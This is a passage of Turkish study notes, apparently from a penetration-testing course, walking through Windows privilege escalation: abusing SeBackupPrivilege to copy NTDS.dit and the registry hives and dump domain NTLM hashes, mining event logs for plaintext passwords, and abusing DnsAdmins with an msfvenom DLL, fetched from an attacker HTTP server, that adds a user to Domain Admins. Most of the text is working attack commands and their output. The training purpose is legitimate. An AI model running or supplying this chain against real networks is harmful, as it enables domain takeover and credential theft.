`expose %cdrive% E:` komutu, oluşturulan shadow copy’yi E: sürücüsünde erişilebilir hale getirir. Bu, shadow copy'nin dosyalarına sistemin canlı sürücüsü olan C: sürücüsüne müdahale etmeden erişilmesini sağlar.

### **Adım 10: Yedeklemeyi Sonlandırma**

`end backup` komutu, shadow copy oluşturma işlemini sonlandırır. Bu komut, işlemi bitirir ve yapılan işlemlerin kalıcı hale gelmesini sağlar.

### **Adım 11: Diskshadow’dan Çıkma**

`exit` komutu, `diskshadow` aracından çıkılmasını sağlar. Bu komut ile shadow copy işlemi sonlandırılmış olur.

### **Adım 12: Yeni Sürücüde Dosyalara Erişim**

Shadow copy oluşturulduktan sonra, **E: sürücüsünde** bulunan dosyalara erişebilirsiniz. Bu sürücü, C: sürücüsünün bir kopyasıdır ve burada **NTDS.dit** dosyasına erişmek mümkündür.

#### **NTDS.dit Dosyasının Local Olarak Kopyalanması**  

Ardından, ACL'yi atlamak ve NTDS.dit `dosyasını` local olarak kopyalamak için `Copy-FileSeBackupPrivilege` cmdlet'ini kullanabiliriz.

```powershell-session
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

- **Copy-FileSeBackupPrivilege:** Bu, `SeBackupPrivilege` yetkisine sahip bir kullanıcıya ait özel bir PowerShell komutudur. `SeBackupPrivilege`, kullanıcılara dosyaları yedekleme yetkisi verir, yani dosyalar üzerinde normalde erişim izni olmayan bir kullanıcının, bu dosyaları kopyalayabilmesini sağlar. Bu komut, dosya kopyalama işlemi için kullanılacak ve hedef ve kaynak dosya yoluna göre işlem yapılacaktır.
    
- **E:\Windows\NTDS\ntds.dit:**
    
    - **Kaynak Dosya Yolu**: Bu, kopyalanacak dosyanın bulunduğu yoldur. Buradaki dosya, **`ntds.dit`** dosyasının bir kopyasını temsil eder. `ntds.dit` dosyası, Active Directory veritabanının yer aldığı ve içerisinde kullanıcı bilgileri, şifre hash'leri gibi kritik bilgileri barındıran bir dosyadır. Bu dosyaya normalde erişim zor olduğu için, `SeBackupPrivilege` yetkisiyle bu dosya kopyalanabilir.
- **C:\Tools\ntds.dit:**
    
    - **Hedef Dosya Yolu**: Bu, **kaynak dosyanın** kopyalanacağı yerdir. `ntds.dit` dosyasını hedef sistemdeki `C:\Tools\ntds.dit` yoluna kopyalamayı amaçlamaktadır. Bu hedef yol, genellikle dosyanın analiz edilmesi veya başka bir işlemin yapılması amacıyla kullanılabilir.

#### **SAM ve SYSTEM Registry Kovanlarını Yedekleme**  

Bu ayrıcalık aynı zamanda SAM ve SYSTEM kayıt defteri kovanlarını yedeklememizi sağlar, böylece Impacket'in `secretsdump.py`'si gibi bir araç kullanarak lokal hesap kimlik bilgilerini çevrimdışı olarak çıkarabiliriz

```cmd-session
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV

The operation completed successfully.
```

Bir klasör veya dosyanın mevcut kullanıcımız veya ait olduğu grup için açık bir reddetme girişi varsa, `FILE_FLAG_BACKUP_SEMANTICS` bayrağı belirtilmiş olsa bile bu dosyaya erişmemizi engelleyeceğini belirtmek gerekir.


#### **NTDS.dit'ten Kimlik Bilgilerini Çıkarma**  

NTDS.dit ayıklandıktan sonra, tüm Active Directory hesap kimlik bilgilerini ayıklamak için `secretsdump.py` veya PowerShell `DSInternals` modülü gibi bir araç kullanabiliriz. `DSInternals` kullanarak domain için sadece `administrator` hesabının NTLM hash'ini elde edelim.

```powershell-session
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 5/6/2021 5:40:30 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-669053619-2741956077-1013132368-512
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: d60dfbbf20548938
      OldCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 94c300d0e47775b407f2496a5cca1a0a
          Iterations: 4096
        DES_CBC_MD5
          Key: d60dfbbf20548938
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:
```


#### **SecretsDump Kullanarak Hash'leri Çıkarma**

Daha önce elde edilen `ntds.dit` dosyasından hash'leri çıkarmak için `SecretsDump` 'ı çevrimdışı olarak da kullanabiliriz. Bunlar daha sonra ek kaynaklara erişmek için pass-the-hash için kullanılabilir veya daha fazla erişim elde etmek için `Hashcat` kullanılarak çevrimdışı olarak kırılabilir. Eğer kırılırsa, müşteriye parola kırma istatistikleri de sunarak domain'deki genel parola gücü ve kullanımı hakkında ayrıntılı bilgi verebilir ve parola politikalarını iyileştirmek için önerilerde bulunabiliriz (minimum uzunluğu artırmak, izin verilmeyen kelimelerden oluşan bir sözlük oluşturmak vb.)

```shell-session
M1R4CKCK@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

<SNIP>
```


## Robocopy

#### **Robocopy ile Dosya Kopyalama**  

Yerleşik yardımcı program [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy), dosyaları yedekleme modunda kopyalamak için de kullanılabilir. Robocopy bir komut satırı dizin çoğaltma aracıdır. Yedekleme işleri oluşturmak için kullanılabilir ve multi-threaded kopyalama, otomatik yeniden deneme, kopyalamaya devam etme yeteneği ve daha fazlası gibi özellikler içerir. Robocopy, tüm dosyaları kopyalamak yerine hedef dizini kontrol edebilmesi ve artık kaynak dizinde bulunmayan dosyaları kaldırabilmesi açısından `copy` komutundan farklıdır. Ayrıca, son kopyalama/yedekleme işi çalıştırıldığından beri değiştirilmemiş dosyaları kopyalamayarak zaman kazanmak için kopyalamadan önce dosyaları karşılaştırabilir.

```cmd-session
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM
```

Bu, herhangi bir harici araç ihtiyacını ortadan kaldırır.


Soru : SeBackupPrivilege haklarından yararlanın ve c:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt adresinde bulunan bayrağı edinin
cevap : 

![Pasted image 20241114003823.png](/img/user/resimler/Pasted%20image%2020241114003823.png)

![Pasted image 20241114003947.png](/img/user/resimler/Pasted%20image%2020241114003947.png)

![Pasted image 20241114004642.png](/img/user/resimler/Pasted%20image%2020241114004642.png)


# **Event Log Readers**

[Process creation](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation) olaylarının ve ilgili komut satırı değerlerinin denetimini etkinleştirildiğini varsayalım. Bu durumda, bu bilgiler Windows güvenlik olay günlüğüne olay kimliği [4688](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688) olarak kaydedilir [:](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688) [Yeni bir process oluşturuldu](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)  Kuruluşlar, savunucuların olası kötü niyetli davranışları izlemesine ve tanımlamasına ve bir sistemde bulunmaması gereken binary'leri belirlemesine yardımcı olmak için process komut satırlarının günlüğe kaydedilmesini etkinleştirebilir. Bu veriler bir SIEM aracına gönderilebilir veya savunuculara ağdaki sistemlerde hangi binarylerin çalıştırıldığına dair görünürlük sağlamak için ElasticSearch gibi bir arama aracına alınabilir. Araçlar daha sonra bir pazarlama yöneticisinin workstation'ından çalıştırılan `whoami`, `netstat` ve `tasklist` komutları gibi potansiyel olarak kötü niyetli etkinlikleri işaretleyecektir.

Bu [çalışma](https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html), saldırganlar tarafından ilk erişimden sonra (`tasklist`, `ver`, `ipconfig`, `systeminfo`, vb.), keşif için (`dir`, `net view`, `ping`, `net use`, `type`, vb.) ve bir ağ içinde kötü amaçlı yazılım yaymak için (`at`, `reg`, `wmic`, `wusa`, vb.) en çok çalıştırılan komutlardan bazılarını göstermektedir. Bu komutların çalıştırılmasını izlemenin yanı sıra, bir kuruluş işleri bir adım öteye taşıyabilir ve ince ayarlanmış AppLocker kurallarını kullanarak belirli komutların yürütülmesini kısıtlayabilir. Güvenlik bütçesi kısıtlı olan bir kuruluş için Microsoft'un bu yerleşik araçlarından yararlanmak, host seviyesinde ağ faaliyetlerine yönelik mükemmel bir görünürlük sağlayabilir. Çoğu modern kurumsal EDR aracı algılama/engelleme gerçekleştirir ancak bütçe ve personel kısıtlamaları nedeniyle birçok kuruluş için erişilemez olabilir. Bu küçük örnek, ağ ve host düzeyinde görünürlük gibi güvenlik iyileştirmelerinin minimum çaba, maliyet ve büyük etkiyle yapılabileceğini göstermektedir.

Birkaç yıl önce, küçük bir güvenlik ekibi olan, kurumsal bir EDR kullanmayan ancak yukarıda ayrıntıları verilen yapılandırmaya benzer (process oluşturmayı ve komut satırı değerlerini denetleyen) bir yapılandırma kullanan orta ölçekli bir kuruluşa yönelik bir sızma testi gerçekleştirdim. Ekibimden bir üyenin, finance departmanındaki bir çalışanın cihazından tasklist komutunu çalıştırdığı sırada tespit edilip engellendi. Bu komutu, Responder kullanarak kimlik bilgilerini ele geçirip çevrimdışı olarak kırdıktan sonra çalıştırmışlardı.

Administrators veya [Event Log Reader](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers)s grubunun üyelerinin bu log dosyasına erişim izni vardır. Sistem yöneticilerinin, bazı görevleri gerçekleştirmeleri için power user veya geliştiricileri bu gruba eklemek isteyebileceği düşünülebilir; böylece onlara yönetici erişimi vermek zorunda kalmazlar.


#### **Grup Üyeliğinin Onaylanması**

```cmd-session
C:\htb> net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.
```

### Komut Yapısı

- `net`: Windows işletim sisteminde yerleşik bir komuttur; ağ ve kullanıcı grubu işlemlerini yönetmek için kullanılır.
- `localgroup`: Yerel bilgisayarda kullanıcı grupları üzerinde işlem yapmak için kullanılan bir alt komuttur.
- `"Event Log Readers"`: Belirli bir grubu hedef alır. Burada, "Event Log Readers" grubu hedeflenmiştir; bu grup üyelerine olay günlüklerine (event logs) erişim izni sağlar.

### Parametre ve Komutlar

Komutun bazı parametreleri ve işlevleri şunlardır:

- **net localgroup [grup adı]**: Belirtilen grubun üye listesini görüntüler. Bu örnekte `"Event Log Readers"` grubuna kimlerin dahil olduğunu listeler.
- **net localgroup [grup adı] [kullanıcı adı] /add**: Belirtilen kullanıcıyı gruba ekler. Örneğin, `"Event Log Readers"` grubuna belirli bir kullanıcı eklenmek istenirse, `net localgroup "Event Log Readers" kullanıcı_adi /add` komutu kullanılır.
- **net localgroup [grup adı] [kullanıcı adı] /delete**: Belirtilen kullanıcıyı gruptan kaldırır. Örneğin, `"Event Log Readers"` grubundan bir kullanıcı çıkarılmak istendiğinde, `net localgroup "Event Log Readers" kullanıcı_adi /delete` komutu kullanılır.


Microsoft, söz dizimi, parametreler ve örnekler dahil olmak üzere tüm yerleşik Windows komutları için bir başvuru [kılavuzu](https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf) yayınlamıştır. Birçok Windows komutu parametre olarak bir parolanın aktarılmasını destekler ve proses komut satırlarının denetimi etkinleştirilirse, bu hassas bilgiler yakalanır.

Windows olaylarını komut satırından [wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) yardımcı programını ve [Get-WinEvent](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1) PowerShell cmdlet'ini kullanarak sorgulayabiliriz.


#### **wevtutil Kullanarak Güvenlik Günlüklerini Arama**

```powershell-session
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

Ayrıca `/u` ve `/p` parametrelerini kullanarak `wevtutil` için alternatif kimlik bilgileri de belirleyebiliriz.

1. **`wevtutil qe Security`**:
    
    - **wevtutil**: Windows Event Log komut satırı aracıdır, günlük kayıtlarını sorgulamak, silmek, oluşturmak veya yapılandırmak için kullanılır.
    - **qe Security**: "Quick Export" anlamına gelir, burada **Security** olay günlüğünü sorgulamak için kullanılır. Güvenlik günlükleri, sistemde gerçekleşen güvenlikle ilgili olayları içerir.
2. **`/rd:true`**: Bu parametre, olayları en yeni tarihliden en eskiye doğru, yani "ters sırada" sıralayarak getirir. Böylece, en son olaylar en üstte görünür.
    
3. **`/f:text`**: Günlük kayıtlarının çıktı formatını **text** (metin) olarak ayarlar. Bu, olayları okunabilir metin formatında görüntüler.
    
4. **`| Select-String "/user"`**: Bu bölüm, komutun çıktısını filtrelemek için kullanılır:
    
    - **|**: Bir boru sembolüdür ve önceki komutun çıktısını sonraki komuta aktarır.
    - **Select-String "/user"**: Çıktıda **"/user"** ifadesini arar ve yalnızca bu ifadeyi içeren satırları gösterir.

### Özetle

Bu komut, Windows Security olay günlüğünü sorgular, en yeni kayıtları en üstte olacak şekilde metin formatında listeler ve yalnızca "/user" ifadesini içeren satırları gösterir. Bu yöntem, belirli kullanıcı etkinliklerini veya kimlik doğrulama olaylarını incelemek için yararlıdır.


#### **Kimlik Bilgilerini wevtutil'e İletme**
```cmd-session
C:\htb> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

1. **Uzak Bilgisayara Erişim Sağlama (`/r:share01`)**:
    
    - **İkinci komut**, `share01` adlı uzak bilgisayardaki **Security (Güvenlik)** olay günlüğüne erişmek için `/r:share01` parametresini kullanır. Bu sayede komut, yerel bilgisayar yerine `share01` adlı uzak bilgisayarda çalıştırılır.
2. **Kimlik Bilgileri Belirtme (`/u` ve `/p`)**:
    
    - İkinci komut ayrıca `/u:julie.clay` ve `/p:Welcome1` parametrelerini kullanarak **julie.clay** adlı kullanıcıyla birlikte **Welcome1** şifresini belirler. Bu kimlik bilgileri, uzak bilgisayarda güvenlik günlüğünü sorgulama iznine sahip bir kullanıcı adına erişim sağlar.
    - İlk komut ise yerel bilgisayarda çalıştırıldığı için ek kimlik bilgilerine gerek duymaz.
3. **Komut Satırı Çıktısını Filtreleme**:
    
    - İlk komut, **`Select-String "/user"`** ifadesini kullanarak çıktıdaki **"/user"** ifadesini içeren satırları bulur.
    - İkinci komut, aynı görevi **`findstr "/user"`** ile gerçekleştirir. Bu iki komut işlevsel olarak benzerdir ve her iki durumda da **"/user"** ifadesini içeren satırları filtreler.

### Özetle

- **İlk komut** yerel bilgisayarda Security olay günlüğünü sorgular ve "/user" ifadesini filtreler.
- **İkinci komut** ise uzak bir bilgisayardaki (share01) olay günlüğüne **julie.clay** adlı kullanıcı ile bağlanarak aynı sorgulamayı yapar ve **findstr** komutunu kullanarak "/user" ifadesini filtreler.


`Get-WinEvent` için syntax aşağıdaki gibidir. Bu örnekte, proses komut satırında `/user` içeren proses oluşturma olaylarını (4688) filtreliyoruz.  

Not: `Security` olay günlüğünü `Get-WInEvent` ile aramak için yönetici erişimi veya `HKLM\System\CurrentControlSet\Services\Eventlog\Security` kayıt defteri anahtarında ayarlanmış izinler gerekir. Sadece `Event Logers Readers` grubuna üyelik yeterli değildir.

#### **Get-WinEvent Kullanarak Güvenlik Günlüklerini Arama**

```powershell-session
PS C:\htb> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

Bu komut, güvenlik olay günlüğünde process oluşturma olaylarını (`4688` olay kimliği) arar ve komut satırı parametrelerinde `"/user"` ifadesini içeren olayları filtreler. Özetle, belirli bir komut satırı argümanını içeren process başlatma olaylarını bulmak için kullanılır.

**Komutun Bölümleri**:

- **`Get-WinEvent -LogName security`**: Güvenlik olay günlüğünden olayları getirir.
- **`where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}`**: `4688` (yeni bir process oluşturma) olay kimliğine sahip olanları filtreler. `$_` ifadesi mevcut olayı ifade eder, `.Properties[8].Value` ise olayın komut satırı bilgisini içerir. `-like '*/user*'` ile bu komut satırında `"/user"` ifadesinin geçip geçmediğini kontrol eder.
- **`Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`**: Filtrelenmiş sonuçlardan yalnızca `CommandLine` bilgisi seçilir.

**Önceki Komutlarla Benzerliği**: Bu komut, `wevtutil qe Security /rd:true /f:text | Select-String "/user"` komutuna benzer. İkisi de güvenlik günlüğünde `"/user"` içeren komut satırlarını aramayı amaçlar, ancak `Get-WinEvent` PowerShell kullanılarak daha ayrıntılı filtreleme yapılmasını sağlar.


`Cmdlet, -Credential` parametresiyle başka bir kullanıcı olarak da çalıştırılabilir.  

Diğer günlükler, komut dosyası bloğu veya modül günlüğü etkinleştirilmişse hassas bilgiler veya kimlik bilgileri de içerebilen [PowerShell Operational](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1) günlüğünü içerir. Bu günlüğe ayrıcalıklı olmayan kullanıcılar erişebilir.


Soru  :Bu bölümde gösterilen yöntemleri kullanarak mary kullanıcısının parolasını bulun.
Cevap : 

1- 
![Pasted image 20241114023034.png](/img/user/resimler/Pasted%20image%2020241114023034.png)

![Pasted image 20241114023237.png](/img/user/resimler/Pasted%20image%2020241114023237.png)

![Pasted image 20241114023411.png](/img/user/resimler/Pasted%20image%2020241114023411.png)


# DnsAdmins

[DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) grubunun üyeleri ağdaki DNS bilgilerine erişebilir. Windows DNS hizmeti özel pluginleri destekler ve local olarak barındırılan DNS zone'larının kapsamında olmayan name sorgularını çözümlemek için bu pluginlerden fonksiyonlar çağırabilir. DNS servisi NT AUTHORITY\SYSTEM olarak çalışır, bu nedenle bu gruba üyelik, bir Domain Controller üzerinde veya ayrı bir sunucunun domain için DNS sunucusu olarak görev yaptığı bir durumda ayrıcalıkları yükseltmek için kullanılabilir. Plugin DLL'nin yolunu belirtmek için built-in [dnscmd](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) yardımcı programını kullanmak mümkündür. Bu mükemmel [yazıda](https://adsecurity.org/?p=4064) ayrıntılı olarak açıklandığı üzere, DNS bir Domain Controller üzerinde çalıştırıldığında (ki bu çok yaygındır) aşağıdaki saldırı gerçekleştirilebilir:

- DNS yönetimi RPC üzerinden gerçekleştirilir  

- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723), DLL'nin yolunu hiçbir şekilde doğrulamadan özel bir DLL yüklememize olanak tanır. Bu, komut satırından `dnscmd` aracı ile yapılabilir  

- `DnsAdmins` grubunun bir üyesi aşağıdaki `dnscmd` komutunu çalıştırdığında, `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key doldurulur  
    
- DNS hizmeti yeniden başlatıldığında, bu yoldaki DLL yüklenecektir (yani, Domain Controller'ın makine hesabının erişebileceği bir ağ paylaşımı)  
    
- Bir saldırgan bir reverse shell elde etmek için özel bir DLL yükleyebilir veya hatta kimlik bilgilerini dökmek için Mimikatz gibi bir aracı DLL olarak yükleyebilir.


## **DnsAdmins Erişiminden Yararlanma**

#### **Malicious DLL Oluşturma**  

`msfvenom` kullanarak bir kullanıcıyı `domain admins` grubuna eklemek için kötü amaçlı bir DLL oluşturabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

Bu komutun amacı, `netadm` adlı kullanıcıyı **domain admins** grubuna eklemektir. Başarıyla çalıştırıldığında, **netadm** hesabı "Domain Admins" grubuna eklenecek ve dolayısıyla etki alanındaki (domain) tüm sistemlerde yönetici ayrıcalıklarına sahip olacaktır.


#### **Local HTTP Sunucusunu Başlatma**  

Ardından, bir Python HTTP sunucusu başlatın.

```shell-session
M1R4CKCK@htb[/htb]$ python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -
```


#### **Dosyayı Hedefe İndirme**  

Dosyayı hedefe indirin.

```powershell-session
PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

Öncelikle ayrıcalıklı olmayan bir kullanıcı ile özel bir DLL yüklemek için `dnscmd` yardımcı programını kullanırsak ne olacağını görelim.


#### **DLL'yi Ayrıcalıklı Olmayan Kullanıcı Olarak Yükleme**

```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

Beklendiği gibi, bu komutu normal bir kullanıcı olarak çalıştırmaya çalışmak başarılı olmaz. Yalnızca `DnsAdmins` grubunun üyelerinin bunu yapmasına izin verilir.


#### **DLL'yi DnsAdmins Üyesi Olarak Yükleme**

```powershell-session
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109          
```

#### **Özelleştirilmiş DLL Yükleme**  

`DnsAdmins` grubundaki grup üyeliğini onayladıktan sonra, özel bir DLL yüklemek için komutu yeniden çalıştırabiliriz.

```cmd-session
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Not: Özel DLL'imizin tam yolunu belirtmeliyiz, aksi takdirde saldırı düzgün çalışmayacaktır.

Yalnızca `dnscmd` yardımcı programı `DnsAdmins` grubunun üyeleri tarafından kullanılabilir, çünkü kayıt defteri anahtarı üzerinde doğrudan izinleri yoktur.  

Kötü amaçlı plugin'imizin yolunu içeren kayıt defteri ayarı yapılandırıldığında ve payload'umuz oluşturulduğunda, DLL, DNS hizmeti bir sonraki başlatılışında yüklenecektir. DnsAdmins grubu üyeliği DNS hizmetini yeniden başlatma olanağı vermez, ancak bu, sistem yöneticilerinin DNS yöneticilerinin yapmasına izin verebileceği bir şey olabilir.

DNS hizmetini yeniden başlattıktan sonra (kullanıcımızın bu düzeyde erişimi varsa), özel DLL'imizi çalıştırabilmeli ve bir kullanıcı ekleyebilmeli (bizim durumumuzda) veya bir reverse shell alabilmeliyiz. DNS sunucusunu yeniden başlatmak için erişimimiz yoksa, sunucu veya hizmet yeniden başlayana kadar beklememiz gerekecektir. Mevcut kullanıcımızın DNS hizmetindeki izinlerini kontrol edelim.


#### **Kullanıcının SID'sini Bulma**  

İlk olarak, kullanıcımızın SID'sine ihtiyacımız var.

```cmd-session
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

#### **DNS Servisinde İzinleri Denetleme**  

Kullanıcının SID'sini aldıktan sonra, servis üzerindeki izinleri kontrol etmek için `sc` komutunu kullanabiliriz. Bu [makaleye](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/) göre, kullanıcımızın sırasıyla `SERVICE_START` ve `SERVICE_STOP` anlamına gelen `RPWP` izinlerine sahip olduğunu görebiliriz.

```cmd-session
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

Windows'ta SDDL sözdiziminin açıklaması için Windows `Temelleri` modülüne göz atın.


#### **DNS Hizmetini Durdurma**  

Bu izinleri onayladıktan sonra, hizmeti durdurmak ve başlatmak için aşağıdaki komutları verebiliriz.

```cmd-session
C:\htb> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

DNS servisi özel DLL'imizi başlatmayı ve çalıştırmayı deneyecektir, ancak durumu kontrol edersek, doğru şekilde başlatılamadığını gösterecektir (bu konuda daha sonra daha fazla bilgi verilecektir).

#### Starting the DNS Service

```cmd-session
C:\htb> sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
        FLAGS              :
```


#### **Grup Üyeliğinin Onaylanması**  

Her şey plana uygun giderse, hesabımız Domain Admins grubuna eklenecek veya özel DLL'miz bize geri bağlantı sağlamak için yapılmışsa bir reverse shell alacak.

```cmd-session
C:\htb> net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

## **Temizlik**  

